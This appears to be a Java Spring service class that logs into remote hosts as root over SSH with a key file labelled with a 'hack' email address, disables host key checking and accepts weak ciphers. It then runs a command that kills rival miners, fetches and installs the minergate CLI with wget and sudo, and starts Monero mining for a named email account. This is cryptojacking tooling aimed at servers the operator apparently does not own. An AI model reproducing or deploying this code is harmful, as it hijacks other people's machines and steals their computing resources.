/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Service;

import Pojos.AccountInfo;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import com.sun.corba.se.impl.orbutil.closure.Constant;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.springframework.stereotype.Service;

@Service
public class ConnectSSH {

    public void connectSSH(AccountInfo accountInfo, Session session) {

        try {
            String cmd = "ps -ef | grep minergate-cli | grep -v grep | awk '{print $2}' | xargs -r kill -9 && sudo apt-get -y update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb && minergate-cli -user lisatthu35@gmail.com -xmr 1";

            String host = accountInfo.getIp();
            String user = "root";
            int port = 22;
            JSch s = new JSch();
            // s.addIdentity("E:\\Soft\\Remote Server Linux\\hack2.ppk");
            s.addIdentity(ConstantVariable.Constant.dirKey + "hacklslol1@yahoo.com" + ConstantVariable.Constant.typeKeyPPK);

            session = s.getSession(user, host, port);
            session.setTimeout(15000);
            session.setConfig("StrictHostKeyChecking", "no");
            session.setConfig("GSSAPIAuthentication", "no");
            session.setConfig("kex", "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256");
            session.setConfig("server_host_key", "ssh-dss,ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521");
            session.setConfig("cipher.c2s",
                    "blowfish-cbc,3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr,3des-ctr,arcfour,arcfour128,arcfour256");

            //session.setServerAliveInterval(30000);
            session.connect();

            ChannelExec channel = (ChannelExec) session.openChannel("exec");

            channel.setCommand(cmd);

            channel.connect();
            System.out.println("connect:");
        } catch (Exception e) {
            System.out.println("connectSSH:" + e.getMessage());
        }
    }

}
